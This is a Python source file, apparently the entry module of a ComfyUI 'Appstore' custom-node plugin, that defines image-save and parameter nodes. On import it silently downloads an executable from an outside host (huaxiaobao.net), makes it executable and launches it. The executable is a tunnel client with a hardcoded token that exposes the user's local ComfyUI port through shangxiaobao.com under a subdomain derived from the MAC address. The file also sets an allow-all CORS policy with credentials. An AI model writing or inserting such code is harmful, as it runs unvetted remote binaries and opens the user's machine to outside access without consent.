import re
import time
from .install import *
from .mime import add_mime_types
add_mime_types()
import aiohttp_cors
import server
import folder_paths
from aiohttp import web
from collections import deque
import os

import platform
import numpy as np
import shutil
from .public import get_port_from_cmdline, replace_time_format_in_filename, \
    find_project_custiom_nodes_path,download_file,set_executable_permission,generate_unique_subdomain,get_mac_address

import threading
from PIL import Image

@server.PromptServer.instance.routes.post("/manager/asset")
async def get_asset(request):
    return web.json_response({'message': 'success', 'data': subdomain})




class ConnectorClient:
    RED = "\033[91m"
    RESET = "\033[0m"
    def __init__(self, local_port, subdomain):
        self.local_port = local_port
        self.server_addr = "shangxiaobao.com"
        self.server_port = "7001"
        self.token = "my_secure_token"
        self.subdomain = subdomain
        self.sd_process = None
        self.connected = False
        self.monitoring_thread = None
        self.stop_monitoring = False
    def create_sdc_ini(self, file_path, subdomain):
        config_content = f"""
[common]
server_addr = "{self.server_addr}"
server_port = {self.server_port}
login_fail_exit = false

[{subdomain}]
type = "http"
local_port = {self.local_port}
subdomain = "{subdomain}"
remote_port = 0
log_file = "{LOG_FILE}"
log_level = "info"
"""
        with open(file_path, "w") as config_file:
            config_file.write(config_content)
    def tail_log(self, filename, num_lines=20):
        try:
            with open(filename, "r") as file:
                return deque(file, num_lines)
        except FileNotFoundError:
            return deque()
    def check_sd_log_for_status(self):
        success_keywords = ["login to server success", "start proxy success"]
        failure_keywords = ["connect to server error", "read tcp", "session shutdown"]
        connection_attempt_pattern = re.compile(r"try to connect to server")
        latest_lines = self.tail_log(LOG_FILE, 20)
        connection_attempt_index = None
        for index, line in enumerate(latest_lines):
            if connection_attempt_pattern.search(line):
                connection_attempt_index = index
        if connection_attempt_index is not None and connection_attempt_index + 1 < len(latest_lines):
            next_line = latest_lines[connection_attempt_index + 1]
            for keyword in success_keywords:
                if keyword in next_line:
                    return "connected"
            return "disconnected"
        return "disconnected"
    def check_and_download_executable(self):
        #if platform.system() != "Windows":
        if not os.path.exists(SDC_EXECUTABLE):
            download_file("https://huaxiaobao.net//connector", SDC_EXECUTABLE)
            set_executable_permission(SDC_EXECUTABLE)

    def start(self):
        self.check_and_download_executable()

        self.create_sdc_ini(INI_FILE, self.subdomain)
        open(LOG_FILE, "w").close()
        env1 = os.environ.copy()
        env1['http_proxy'] = ''
        env1['https_proxy'] = ''
        env1['no_proxy'] = '*'
        try:
            with open(LOG_FILE, "a") as log_file:
                self.sd_process = subprocess.Popen([SDC_EXECUTABLE, "-c", INI_FILE], stdout=log_file, stderr=log_file,
                                                   env=env1)
            print(f"SD client started with PID: {self.sd_process.pid}")
            self.stop_monitoring = False
            self.monitoring_thread = threading.Thread(target=self.monitor_connection_status, daemon=True)
            self.monitoring_thread.start()
        except FileNotFoundError:
            print(f"Error: '{SDC_EXECUTABLE}' not found。")
        except Exception as e:
            print(f"Error starting SD client: {e}")
    def monitor_connection_status(self):
        while not self.stop_monitoring:
            status = self.check_sd_log_for_status()
            if status == "connected":
                if not self.connected:
                    print(f"SD client successfully connected with PID: {self.sd_process.pid}")
                    self.connected = True
            else:
                if self.connected:
                    print(f"{self.RED}Waiting for SD client to connect...{self.RESET}")
                    self.connected = False
            time.sleep(1)
    def stop(self):
        if self.sd_process and self.sd_process.poll() is None:
            self.sd_process.terminate()
            self.sd_process.wait()
            print("SD client stopped。")
        else:
            print("SD client is not running。")
        self.connected = False
        self.stop_monitoring = True
    def is_connected(self):
        return self.connected
    def clear_log(self):
        if os.path.exists(LOG_FILE):
            open(LOG_FILE, "w").close()
            print("SD client log cleared。")




class ComfyUIAppstoreHost:
    @classmethod
    def INPUT_TYPES(s):
        return {
            "required": {
                "ComfyUI 主机地址":  (
                    "STRING",
                    {"multiline": False, "default": "shangxiaobao.com:7930"},),                
            }
        }

    RETURN_TYPES = ()
    RETURN_NAMES = ()

    FUNCTION = "run"

    CATEGORY = "Appstore"

    def run(self, input_id, default_value=None):
        return


class ComfyUIAppstoreParam:
    @classmethod
    def INPUT_TYPES(s):
        return {
            "required": {
                "标注节点接入": ("*"),
                "序号": ("INT", {"default": 20, "min": 1, "max": 10000}),
                "参数名称": (
                    "STRING",
                    {"multiline": False, "default": "参数名称"},
                ),
                "类型":  (["file", "mask", "selection", "text","image_editer","image_selection", "combo_image_selection"],),
                "数值约束或依赖项":  (
                    "STRING",
                    {"multiline": False, "default": ".png,.jpg,.jpeg,.webp"},),
                "替换项": (
                    "STRING",
                    {"multiline": False, "default": "amount"},
                ),
            }
        }

    RETURN_TYPES = ()
    RETURN_NAMES = ()

    FUNCTION = "run"

    CATEGORY = "Appstore"

    def run(self, input_id, default_value=None):
        return    
    
    
class ComfyUIAppstoreSaveImage:
    def __init__(self):
        self.output_dir = folder_paths.get_output_directory()
        self.type = "output"
        self.prefix_append = "Appstore_"
        self.compress_level = 4
    @classmethod
    def INPUT_TYPES(s):
        return {"required":
                    {"images": ("IMAGE",),
                     "filename_prefix": ("STRING", {"default": "ComfyUI"})},
                }
    RETURN_TYPES = ()
    FUNCTION = "save_images"
    OUTPUT_NODE = True
    CATEGORY = "comfyAppstore"
    def save_images(self, images, filename_prefix="ComfyUI"):
        filename_prefix = self.prefix_append + filename_prefix
        filename_prefix = replace_time_format_in_filename(filename_prefix)
        full_output_folder, filename, counter, subfolder, filename_prefix = folder_paths.get_save_image_path(
            filename_prefix, self.output_dir, images[0].shape[1], images[0].shape[0])
        results = list()
        for (batch_number, image) in enumerate(images):
            i = 255. * image.cpu().numpy()
            img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))
            metadata = None
            filename_with_batch_num = filename.replace("%batch_num%", str(batch_number))
            file = f"{filename_with_batch_num}_{counter:05}_.png"
            img.save(os.path.join(full_output_folder, file), pnginfo=metadata, compress_level=self.compress_level)
            results.append({
                "filename": file,
                "subfolder": subfolder,
                "type": self.type
            })
            counter += 1
        return {"ui": {"images": results}}


app = web.Application()
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(
        allow_credentials=True,
        expose_headers="*",
        allow_headers="*",
    )
})

for route in list(app.router.routes()):
    cors.add(route)

workspace_path = os.path.join(os.path.dirname(__file__))
dist_path = os.path.join(workspace_path, 'appstore_panel')
if os.path.exists(dist_path):
    server.PromptServer.instance.app.add_routes([
        web.static('/appstore_panel/', dist_path),
    ])


WEB_DIRECTORY = "./web"
NODE_CLASS_MAPPINGS = {
    "sdAppstore_saveImage": ComfyUIAppstoreSaveImage,
    "ComfyUIAppstoreParam": ComfyUIAppstoreParam,
    'ComfyUIAppstoreHost': ComfyUIAppstoreHost
}
NODE_DISPLAY_NAME_MAPPINGS = {
    "ComfyUIAppstoreSaveImage": "ComfyUI Appstore Save Image (ComfyUI_Appstore)",
    "ComfyUIAppstoreParam": 'ComfyUI Appstore Param (ComfyUI_Appstore)',
    'ComfyUIAppstoreHost': 'ComfyUI Appstore Host (ComfyUI_Appstore)',
}



temp_path = find_project_custiom_nodes_path() + 'ComfyUI_Appstore/temp_appstore/'
if os.path.exists(temp_path):
    shutil.rmtree(temp_path)
os.makedirs(temp_path, exist_ok=True)



input_directory = folder_paths.get_input_directory()
os.makedirs(input_directory, exist_ok=True)
save_input_directory = input_directory + '/temp'
os.makedirs(save_input_directory, exist_ok=True)

PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
SD_CLIENT_DIR = os.path.join(PLUGIN_DIR, "connector")
SDC_EXECUTABLE = os.path.join(SD_CLIENT_DIR, "connector" if platform.system() != "Windows" else "connector.exe")
INI_FILE = os.path.join(SD_CLIENT_DIR, "connector.ini")
LOG_FILE = os.path.join(SD_CLIENT_DIR, "connector.log")


subdomain = ""
websocket = None
#if platform.system() != "Darwin":
local_port = get_port_from_cmdline()
subdomain = generate_unique_subdomain(get_mac_address(), local_port)
#if os.path.exists(SDC_EXECUTABLE):
client = ConnectorClient(local_port=local_port, subdomain=subdomain)
client.start()


#thread_run()

